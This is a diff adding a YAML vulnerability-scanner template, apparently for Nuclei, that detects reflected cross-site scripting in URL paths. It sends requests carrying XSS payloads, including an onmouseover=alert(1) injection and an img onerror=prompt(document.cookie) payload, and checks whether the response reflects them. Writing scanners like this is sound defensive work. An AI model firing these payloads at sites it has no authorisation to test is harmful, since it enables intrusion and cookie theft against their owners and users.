@@ -1,0 +1,32 @@
+id: Dir_XSS
+
+info:
+  name: Dir or URL support input of user what he type after dir or url it's show on response body
+  author: abdulrahman
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/\"><xss>"
+      - "{{BaseURL}}/\"onmouseover=\"alert(1)"
+      - "{{BaseURL}}/#prettyPhoto%3Cimg%20src=x%20onerror=prompt(document.cookie)%3E;/"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: word
+        part: body
+        words:
+          - "\"><xss>"
+          - "\"onmouseover=\"alert(1)"
+          - "prompt(document.cookie)"
+
